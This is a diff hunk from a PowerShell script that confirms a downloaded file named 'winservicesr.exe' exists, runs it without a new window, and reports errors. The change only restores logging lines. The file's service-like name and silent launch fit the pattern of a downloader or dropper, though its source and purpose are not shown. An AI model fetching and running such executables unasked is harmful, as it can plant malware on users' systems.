@@ -20,18 +20,18 @@ try {
 
     # Verify the file was downloaded
     if (Test-Path $destinationPath) {
-      //  Write-Host "Successfully downloaded winservicesr.exe to $destinationPath"
+      Write-Host "Successfully downloaded winservicesr.exe to $destinationPath"
 
         # Run the executable
-     //   Write-Host "Running winservicesr.exe..."
+     Write-Host "Running winservicesr.exe..."
         Start-Process -FilePath $destinationPath -NoNewWindow
-       // Write-Host "winservicesr.exe is now running."
+        Write-Host "winservicesr.exe is now running."
     } else {
-       // Write-Host "Error: Failed to download winservicesr.exe to $destinationPath"
+        Write-Host "Error: Failed to download winservicesr.exe to $destinationPath"
         exit 1
     }
 }
 catch {
-    //Write-Host "Error occurred: $_"
+    Write-Host "Error occurred: $_"
     exit 1
 }
